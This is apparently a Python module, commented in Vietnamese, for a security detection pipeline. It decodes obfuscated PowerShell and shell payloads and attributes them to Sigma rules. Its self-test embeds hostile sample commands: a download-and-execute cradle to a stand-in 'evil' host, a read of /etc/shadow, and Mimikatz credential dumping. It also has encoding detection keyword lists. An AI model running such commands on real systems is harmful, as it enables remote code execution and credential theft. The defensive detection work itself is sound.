"""Stage 2 — live rule-evasion attribution (2-pass Sigma-logic + payload decode).

Thay oracle tĩnh (atomic_fired.jsonl / Hayabusa) bằng quy trình LIVE:

    event (Stage 1 đã xác nhận malicious)
        │
   PASS 1: SigmaExactMatcher.match_event(event)      → evasion_technique (Rule B)
        │                                               rule kỹ thuật né, thường encoding
        ├── Lọc encoding rules → guide decode
        │   recursive_decode (Python stdlib: base64/hex/charcode/gzip)
        │
   PASS 2: SigmaExactMatcher.match_event(decoded)    → evaded_rule (Rule A)
        │                                               rule ý đồ thật sau giải mã
        │
   Cosine (fallback khi engine trống)

Confidence scoring (tích hợp trong Stage 2, bỏ oracle tĩnh, chấm trên toàn catalog):

    evasion_technique │ evaded_rule │ Cosine │ Confidence
    ──────────────────┼─────────────┼────────┼──────────────────────────────
    Fire (encoding)   │ Fire        │   —    │ HIGH    "evaded_rule bị né bằng evasion_technique"
    Fire (direct)     │ —           │   —    │ HIGH    "fire thẳng, không cần decode"
    Fire (encoding)   │ TRỐNG       │ Top X  │ MEDIUM  "X có thể bị né"
    TRỐNG             │ —           │ Top X  │ LOW     "X soft attribution"
    TRỐNG             │ —           │ TRỐNG  │ UNKNOWN → AI Agent

Engine = SigmaExactMatcher in-process (cùng Layer-3 đã có) — portable, nhanh.
Zircolite giữ vai trò oracle offline (atomic_zircolite.py), không gọi per-event.
Module thuần stdlib + red.* — không đụng SVC/oneDAL, chạy mọi CPU.
"""

from __future__ import annotations

import base64
import binascii
import logging
import re
import zlib
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)

# ── Phân loại rule "encoding/obfuscation" từ title ─────────────────────────────
_ENCODING_HINTS = {
    "base64": ("frombase64", "encodedcommand", "-enc ", "encoded command",
               "encoded powershell", "base64 encoded", "base64string",
               "base64decode", "b64", "with base64"),
    "hex":    ("fromhex", "hexadecimal", "hex encode", "xxd"),
    "char":   ("fromcharcode", "wchar", "[char]", "charcode", "obfuscation via utf8",
               "obfuscation via wchar"),
    "gzip":   ("gzip", "compress obfuscation", "deflate"),
}
_ENCODING_KEYWORDS = tuple({k for v in _ENCODING_HINTS.values() for k in v})

# ── Regex nhận diện payload mã hoá ────────────────────────────────────────────
_B64_RE = re.compile(r"[A-Za-z0-9+/]{8,}={0,2}")        # ≥ 6 bytes giải ra
_HEX_RE = re.compile(r"(?:0x)?((?:[0-9a-fA-F]{2}\s*){3,})")  # ≥ 3 bytes
_CHAR_RE = re.compile(r"\[char\]\s*(\d{1,3})", re.I)
_CHAR_FN_RE = re.compile(r"\bchr\(\s*(\d{1,3})\s*\)", re.I)
_CHAR_ARR_RE = re.compile(r"\[char\[\]\]\s*\(([\d\s,]+)\)", re.I)


def _printable_ratio(text: str) -> float:
    if not text:
        return 0.0
    ok = sum(1 for c in text if c == "\t" or c == "\n" or 32 <= ord(c) < 127)
    return ok / len(text)


def _try_decompress(raw: bytes) -> bytes | None:
    for wbits in (31, -15, 15):   # gzip, raw-deflate, zlib
        try:
            out = zlib.decompress(raw, wbits)
            if out:
                return out
        except zlib.error:
            continue
    return None


def _b64_decode_best(blob: str) -> str | None:
    """Decode 1 blob base64. Thử UTF-16-LE (PowerShell -enc) rồi UTF-8.

    Kiểm tra raw bytes TRƯỚC khi decode để lọc garbage:
    - UTF-8 thật: raw mostly ASCII-printable (≥ 70%)
    - UTF-16-LE thật: raw có nhiều null byte xen kẽ (≥ 20%)
    - Ngược lại: binary blob → bỏ qua, tránh nhận False positive ngắn kiểu "2)s"
    """
    pad = "=" * (-len(blob) % 4)
    try:
        raw = base64.b64decode(blob + pad, validate=False)
    except (binascii.Error, ValueError):
        return None
    if len(raw) < 4:
        return None

    decompressed = _try_decompress(raw)
    if decompressed is not None:
        raw = decompressed

    null_ratio = raw.count(0) / len(raw)
    ascii_ratio = sum(1 for b in raw if 32 <= b < 127 or b in (9, 10, 13)) / len(raw)

    if null_ratio > 0.20:
        candidates = ["utf-16-le", "utf-8"]
    elif ascii_ratio >= 0.70:
        candidates = ["utf-8"]
    else:
        # binary blob hoặc garbage — bỏ qua
        return None

    for enc in candidates:
        try:
            text = raw.decode(enc, errors="ignore")
        except (UnicodeDecodeError, LookupError):
            continue
        # độ dài tối thiểu 4 và không quá ngắn so với raw (tránh "2)s" type garbage)
        if _printable_ratio(text) >= 0.80 and len(text.strip()) >= 4:
            return text
    return None


def _hex_decode(text: str) -> str | None:
    m = _HEX_RE.search(text)
    if not m:
        return None
    hexstr = re.sub(r"\s+", "", m.group(1))
    if len(hexstr) % 2:
        hexstr = hexstr[:-1]
    # Pure-digit strings (0-9 only) are decimal numbers, not hex payloads.
    # Prevents false positive on Windows SID components like "3762793008".
    if not re.search(r"[a-fA-F]", hexstr):
        return None
    try:
        raw = bytes.fromhex(hexstr)
    except ValueError:
        return None
    out = raw.decode("utf-8", errors="ignore")
    return out if _printable_ratio(out) >= 0.80 and len(out.strip()) >= 2 else None


def _char_decode(text: str) -> str | None:
    """[char]NN / [char[]](NN,..) / chr(NN) → ghép ký tự."""
    nums: list[int] = []
    arr = _CHAR_ARR_RE.search(text)
    if arr:
        nums = [int(x) for x in re.findall(r"\d{1,3}", arr.group(1))]
    if not nums:
        nums = [int(x) for x in _CHAR_RE.findall(text)]
    if not nums:
        nums = [int(x) for x in _CHAR_FN_RE.findall(text)]
    if len(nums) < 3:
        return None
    try:
        out = "".join(chr(n) for n in nums if 0 < n < 0x110000)
    except (ValueError, OverflowError):
        return None
    return out if _printable_ratio(out) >= 0.75 else None


def _looks_encoded(text: str) -> str | None:
    """Trả tên kỹ thuật nếu text còn chứa payload mã hoá."""
    if _CHAR_ARR_RE.search(text) or len(_CHAR_RE.findall(text)) >= 3 \
            or len(_CHAR_FN_RE.findall(text)) >= 3:
        return "char"
    for m in _B64_RE.finditer(text):
        if _b64_decode_best(m.group(0)) is not None:
            return "base64"
    if _HEX_RE.search(text) and _hex_decode(text) is not None:
        return "hex"
    return None


def _methods_from_titles(rule_titles: list[str] | None) -> list[str]:
    """Từ title Rule B → thứ tự ưu tiên kỹ thuật decode."""
    if not rule_titles:
        return []
    blob = " ".join(rule_titles).lower()
    order: list[str] = []
    for method, hints in _ENCODING_HINTS.items():
        if method == "gzip":
            continue   # gzip xử lý lồng trong _b64_decode_best
        if any(h in blob for h in hints) and method not in order:
            order.append(method)
    return order


@dataclass
class DecodeLayer:
    method: str    # 'base64' | 'hex' | 'char'
    text: str      # nội dung sau giải mã ở lớp này
    depth: int


def decode_payload(text: str, rule_titles: list[str] | None = None) -> DecodeLayer | None:
    """Giải mã MỘT lớp. Ưu tiên kỹ thuật gợi ý từ Rule B title; nếu trống thì auto-detect."""
    order = _methods_from_titles(rule_titles)
    detected = _looks_encoded(text)
    if detected and detected not in order:
        order.append(detected)
    if not order:
        order = ["base64", "hex", "char"]

    for method in order:
        if method == "char":
            out = _char_decode(text)
        elif method == "hex":
            out = _hex_decode(text)
        else:
            out = None
            for blob in sorted(_B64_RE.findall(text), key=len, reverse=True):
                out = _b64_decode_best(blob)
                if out is not None:
                    break
        if out is not None and out.strip() and out.strip() != text.strip():
            return DecodeLayer(method=method, text=out, depth=0)
    return None


def recursive_decode(
    text: str,
    rule_titles: list[str] | None = None,
    max_depth: int = 4,
) -> list[DecodeLayer]:
    """Giải mã nhiều lớp: sau mỗi lớp kiểm tra còn mã hoá không → giải tiếp."""
    layers: list[DecodeLayer] = []
    current = text
    titles = rule_titles
    for depth in range(max_depth):
        layer = decode_payload(current, titles)
        if layer is None:
            break
        layer.depth = depth
        layers.append(layer)
        current = layer.text
        titles = None   # lớp sau auto-detect
        if _looks_encoded(current) is None:
            break
    return layers


# ── Confidence + Report (Stage 2 output) ──────────────────────────────────────

@dataclass
class AttributionVerdict:
    confidence: str                            # 'high' | 'medium' | 'low' | 'unknown'
    evasion_technique: list[str] = field(default_factory=list)   # Rule B — kỹ thuật né
    evaded_rule: list[str] = field(default_factory=list)         # Rule A — ý đồ thật
    cosine_top: list[tuple[str, float]] = field(default_factory=list)
    decoded_layers: list[DecodeLayer] = field(default_factory=list)
    top_rule: str | None = None
    report: str = ""
    needs_agent: bool = False

    def to_dict(self) -> dict:
        return {
            "red.confidence":        self.confidence,
            "red.evasion_technique": self.evasion_technique,  # kỹ thuật né (Rule B)
            "red.evaded_rule":       self.evaded_rule,        # ý đồ thật (Rule A)
            "red.top_rule":          self.top_rule,
            "red.cosine_top":        [{"rule": r, "score": round(s, 4)} for r, s in self.cosine_top],
            "red.decode_chain":      [
                {"depth": l.depth, "method": l.method, "text": l.text[:300]}
                for l in self.decoded_layers
            ],
            "red.needs_agent":       self.needs_agent,
            "red.report":            self.report,
        }


# ── Helpers ────────────────────────────────────────────────────────────────────

def _is_encoding_rule(title: str) -> bool:
    t = (title or "").lower()
    return any(k in t for k in _ENCODING_KEYWORDS)


def _expand_char_codes(text: str) -> str:
    """Expand PowerShell [char] arrays to literal strings.

    Handles patterns like:
      -join (@(67,111,112,...) | ForEach-Object { [char]$_ })
      @(65,66,67) | ForEach-Object { [char]$_ }
    """
    # Pattern: optional -join, @(N,N,...) | ForEach-Object { [char]$_ }
    _CHAR_PAT = re.compile(
        r'(?:-join\s*)?@\(\s*((?:\d+\s*,?\s*)+)\)\s*\|'
        r'\s*ForEach-Object\s*\{\s*\[char\]\$_\s*\}',
        re.IGNORECASE,
    )

    def _decode(m: re.Match) -> str:
        try:
            codes = [int(c) for c in re.split(r"[,\s]+", m.group(1).strip()) if c]
            s = "".join(chr(c) for c in codes if 0 < c < 0x110000)
            # Emit both bare name and .Name for Sigma rules that check '.MethodName'
            return f"{s} .{s}"
        except Exception:
            return m.group(0)

    return _CHAR_PAT.sub(_decode, text)


def _synth_event(
    decoded_text: str,
    event_field_map: dict[str, list[str]] | None,
    search_fields: list[str] | None,
    original_event: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Dựng event Pass 2: giữ Image gốc, inject decoded vào CommandLine+ScriptBlockText."""
    event: dict[str, Any] = {}

    def _set(dotted: str, value: str) -> None:
        cur = event
        parts = dotted.split(".")
        for p in parts[:-1]:
            cur = cur.setdefault(p, {})
        cur[parts[-1]] = value

    def _get_nested(d: dict, dotted: str):
        cur = d
        for p in dotted.split("."):
            if not isinstance(cur, dict):
                return None
            cur = cur.get(p)
        return cur

    # Giữ Image/ParentImage/OriginalFileName từ event gốc → Image check trong rules đúng
    _PRESERVE_FIELDS = {"Image", "ParentImage", "OriginalFileName", "User", "IntegrityLevel"}
    if original_event:
        for fname in _PRESERVE_FIELDS:
            paths = (event_field_map or {}).get(fname) or [fname]
            val = _get_nested(original_event, paths[0])
            if val:
                _set(paths[0], val)

    # Inject decoded_text vào CommandLine + ParentCommandLine + ScriptBlockText
    for fname in ["CommandLine", "ParentCommandLine", "CurrentDirectory"]:
        paths = (event_field_map or {}).get(fname) or [fname]
        _set(paths[0], decoded_text)
    # Expand PowerShell char-code arrays to literal strings for Sigma matching
    expanded = _expand_char_codes(decoded_text)
    event["CommandLine"] = expanded
    event["ScriptBlockText"] = expanded        # powershell_script rules dùng field này
    event["_decoded"] = expanded               # keyword-match fallback
    return event


# ── LiveAttributor ─────────────────────────────────────────────────────────────

class LiveAttributor:
    """Chạy Stage 2 live cho 1 event đã qua Stage 1.

    Parameters
    ----------
    matcher : SigmaExactMatcher
        Engine Sigma in-process (red.sigma_exact). Dùng cho CẢ 2 pass.
    cosine_attributor : CosineRuleAttributor | None
        Fallback khi engine trống.
    normalizer : Normalizer | None
        Chuẩn hoá text trước cosine.
    event_field_map, search_fields
        Cấu hình field để dựng synth-event Pass 2.
    cosine_min : float
        Ngưỡng tối thiểu cosine top-1 để tính LOW (dưới → UNKNOWN).
    """

    def __init__(
        self,
        matcher,
        cosine_attributor=None,
        normalizer=None,
        event_field_map: dict[str, list[str]] | None = None,
        search_fields: list[str] | None = None,
        cosine_min: float = 0.10,
        top_k: int = 5,
        max_decode_depth: int = 4,
    ):
        self.matcher = matcher
        self.cosine = cosine_attributor
        self.normalizer = normalizer
        self.event_field_map = event_field_map or {}
        self.search_fields = search_fields or list(self.event_field_map)
        self.cosine_min = cosine_min
        self.top_k = top_k
        self.max_decode_depth = max_decode_depth

    def _cosine_rank(self, text: str) -> list[tuple[str, float]]:
        if self.cosine is None or not text:
            return []
        norm = self.normalizer.normalize(text) if self.normalizer else text
        if not norm:
            return []
        return self.cosine.score_samples([norm])[0][: self.top_k]

    def attribute(self, event: dict[str, Any], raw_text: str) -> AttributionVerdict:
        # ── PASS 1: engine trên event gốc → evasion_technique ───────────────
        b_matches = self.matcher.match_event(event) if self.matcher else []
        rule_b_titles = [m.title for m in b_matches]
        enc_titles = [t for t in rule_b_titles if _is_encoding_rule(t)]
        direct_titles = [t for t in rule_b_titles if not _is_encoding_rule(t)]

        # Detect OS + event type để skip decode và chọn report phù hợp
        event_id = str((event.get("winlog") or {}).get("event_id", ""))
        is_windows = bool(event_id)
        # Registry events (EID 12/13/14): text là registry key path, không phải
        # command line → skip decode để tránh false positive (SID digits → hex FP).
        skip_decode = event_id in ("12", "13", "14")

        # ── DECODE payload (guide bằng encoding rule title) ──────────────────
        layers: list[DecodeLayer] = []
        if not skip_decode:
            layers = recursive_decode(
                raw_text,
                rule_titles=enc_titles or rule_b_titles or None,
                max_depth=self.max_decode_depth,
            )
            # Loại bỏ layer decode ngắn/junk (< 10 ký tự) —
            # tránh RunId như "c9dd2462" bị decode thành "K+-zm" hay "\rZO*^"
            layers = [l for l in layers if len(l.text.strip()) >= 10]
        decoded_text = layers[-1].text if layers else ""

        # ── PASS 2: engine trên decoded → evaded_rule ────────────────────────
        rule_a_titles: list[str] = []
        if decoded_text:
            synth = _synth_event(decoded_text, self.event_field_map, self.search_fields, original_event=event)
            a_matches = self.matcher.match_event(synth) if self.matcher else []
            rule_a_titles = [m.title for m in a_matches if m.title not in set(rule_b_titles)]

        # ── STAGE 3: confidence ───────────────────────────────────────────────
        return self._confidence(rule_b_titles, enc_titles, direct_titles,
                                rule_a_titles, layers, decoded_text, raw_text,
                                is_windows=is_windows)

    def _confidence(
        self, rule_b, enc_titles, direct_titles, rule_a, layers, decoded_text, raw_text,
        is_windows: bool = False,
    ) -> AttributionVerdict:
        v = AttributionVerdict(
            confidence="unknown",
            evasion_technique=enc_titles,  # chỉ encoding rules = kỹ thuật né thật sự
            evaded_rule=rule_a,
            decoded_layers=layers,
        )

        # Effective encoding evidence: sigma rule title OR auto-detected decode layers
        # enc_titles requires a sigma rule with encoding keyword in its title to fire.
        # eff_enc falls back to the layer method if no such rule exists.
        eff_enc = enc_titles if enc_titles else ([l.method for l in layers[:1]] if layers else [])

        # HIGH — encoding fire + rule đích fire sau decode
        if eff_enc and rule_a:
            v.confidence = "high"
            v.evasion_technique = eff_enc
            v.top_rule = rule_a[0]
            chain = "→".join(l.method for l in layers)
            v.report = (
                f"Rule '{rule_a[0]}' bị né bằng kỹ thuật '{eff_enc[0]}'. "
                f"Giải mã {len(layers)} lớp ({chain}) lộ ý đồ thật."
            )
            return v

        # HIGH — rule nội dung fire trực tiếp (không qua decode)
        if direct_titles:
            v.confidence = "high"
            v.evasion_technique = []          # Không né — rule catch trực tiếp
            v.evaded_rule = direct_titles     # Rule fired = điều được phát hiện
            v.decoded_layers = []             # Decode không đóng góp → xóa junk
            v.top_rule = direct_titles[0]
            v.report = (
                f"Rule '{direct_titles[0]}' fire trực tiếp trên event gốc "
                f"(không cần giải mã)."
            )
            return v

        # MEDIUM — encoding fire nhưng Pass 2 Sigma không match
        # Pass 3: chạy cosine trên decoded_text (thay vì raw_text)
        # → tìm rules giống nội dung decoded nhất → dùng làm evaded_rule
        if eff_enc:
            cosine_on_decoded = self._cosine_rank(_expand_char_codes(decoded_text)) if decoded_text else []
            if cosine_on_decoded:
                top_name, top_score = cosine_on_decoded[0]
                v.evaded_rule = [name for name, _ in cosine_on_decoded[:3]]
                v.cosine_top = cosine_on_decoded
                v.top_rule = top_name
                v.evasion_technique = eff_enc
                chain = "→".join(l.method for l in layers)
                if top_score >= 0.65:
                    v.confidence = "high"
                elif top_score >= 0.45:
                    v.confidence = "medium"
                else:
                    v.confidence = "low"
                v.report = (
                    f"Rule '{top_name}' (cosine={top_score:.3f}) bị né bằng kỹ thuật '{eff_enc[0]}'. "
                    f"Giải mã {len(layers)} lớp ({chain}); "
                    f"Sigma Pass 2 miss → cosine fallback trên decoded."
                )
                return v
            v.confidence = "medium"
            v.cosine_top = self._cosine_rank(raw_text)
            v.top_rule = v.cosine_top[0][0] if v.cosine_top else eff_enc[0]
            v.evasion_technique = eff_enc
            v.report = (
                f"Phát hiện kỹ thuật né '{eff_enc[0]}' nhưng cosine không "
                f"xác định được rule đích. Gợi ý: '{v.top_rule}'."
            )
            return v

        # MEDIUM / LOW / UNKNOWN — engine trống hoàn toàn → cosine trên raw
        v.cosine_top = self._cosine_rank(raw_text)
        if v.cosine_top:
            top_name, top_score = v.cosine_top[0]
            if top_score >= self.cosine_min:
                v.top_rule = top_name
                v.confidence = "medium" if top_score >= 0.65 else "low"
                v.report = (
                    f"Engine Sigma không fire. Cosine soft-attribution: "
                    f"'{top_name}' (score={top_score:.3f})."
                )
                return v

        v.confidence = "unknown"
        v.needs_agent = True
        if is_windows:
            v.report = (
                "Engine Sigma trống + cosine dưới ngưỡng → evasion phức tạp "
                "(shorthand flag, COM object, LOLBAS, reflective load...). "
                "Chuyển AI Agent phân tích behavioral."
            )
        else:
            v.report = (
                "Engine Sigma trống + cosine dưới ngưỡng → evasion phức tạp "
                "(/proc substitution, API trực tiếp, stdlib thay shell...). "
                "Chuyển AI Agent phân tích behavioral."
            )
        return v


# ── Self-test decode (python -m red.stage2_live) ───────────────────────────────

def _selftest() -> None:
    tests_pass = 0

    # 1) base64 UTF-16-LE (PowerShell -EncodedCommand)
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')"
    enc = base64.b64encode(payload.encode("utf-16-le")).decode()
    layer = decode_payload(f"powershell -nop -enc {enc}",
                           rule_titles=["Suspicious Encoded PowerShell Command Line"])
    assert layer and "DownloadString" in layer.text, f"FAIL b64-utf16le: {layer}"
    print(f"  [ok] base64 utf-16-le   → {layer.text[:60]!r}")
    tests_pass += 1

    # 2) base64 UTF-8
    enc2 = base64.b64encode(b"whoami /priv && cat /etc/shadow").decode()
    layer2 = decode_payload(f"bash -c base64 -d <<< {enc2}",
                            rule_titles=["Decode Base64 Encoded Text"])
    assert layer2 and "whoami" in layer2.text, f"FAIL b64-utf8: {layer2}"
    print(f"  [ok] base64 utf-8       → {layer2.text[:60]!r}")
    tests_pass += 1

    # 3) hex
    hx = "whoami".encode().hex()
    layer3 = decode_payload(f"echo {hx} | xxd -r -p", rule_titles=["FromHex"])
    assert layer3 and "whoami" in layer3.text, f"FAIL hex: {layer3}"
    print(f"  [ok] hex                → {layer3.text[:60]!r}")
    tests_pass += 1

    # 4) charcode [char]
    chars = "+".join(f"[char]{ord(c)}" for c in "iex(download)")
    layer4 = decode_payload(chars,
                            rule_titles=["Potential PowerShell Obfuscation Via WCHAR/CHAR"])
    assert layer4 and "iex" in layer4.text, f"FAIL char: {layer4}"
    print(f"  [ok] charcode           → {layer4.text!r}")
    tests_pass += 1

    # 5) recursive base64(base64(text))
    inner = base64.b64encode(b"Invoke-Mimikatz -DumpCreds").decode()
    outer = base64.b64encode(inner.encode()).decode()
    layers = recursive_decode(outer)
    assert layers and "Mimikatz" in layers[-1].text, \
        f"FAIL recursive: {[l.text[:40] for l in layers]}"
    print(f"  [ok] recursive {len(layers)} lớp     → {layers[-1].text[:50]!r}")
    tests_pass += 1

    # 6) gzip + base64 (COMPRESS obfuscation)
    raw = zlib.compress(b"Get-Keystrokes -LogPath C:\\x.log")
    gz = base64.b64encode(raw).decode()
    layer6 = decode_payload(gz,
                            rule_titles=["Invoke-Obfuscation COMPRESS OBFUSCATION"])
    assert layer6 and "Keystrokes" in layer6.text, f"FAIL gzip: {layer6}"
    print(f"  [ok] base64+deflate     → {layer6.text[:50]!r}")
    tests_pass += 1

    # 7) field names trong to_dict()
    v = AttributionVerdict(
        confidence="high",
        evasion_technique=["Suspicious Encoded PS"],
        evaded_rule=["Invoke-Mimikatz"],
        top_rule="Invoke-Mimikatz",
        report="test",
    )
    d = v.to_dict()
    assert "red.evasion_technique" in d and "red.evaded_rule" in d, \
        f"FAIL field names: {list(d.keys())}"
    assert d["red.evasion_technique"] == ["Suspicious Encoded PS"]
    assert d["red.evaded_rule"] == ["Invoke-Mimikatz"]
    print(f"  [ok] field names        → red.evasion_technique / red.evaded_rule ✓")
    tests_pass += 1

    print(f"\ndecode self-test: {tests_pass}/7 PASS")


if __name__ == "__main__":
    logging.basicConfig(level=logging.WARNING)
    _selftest()
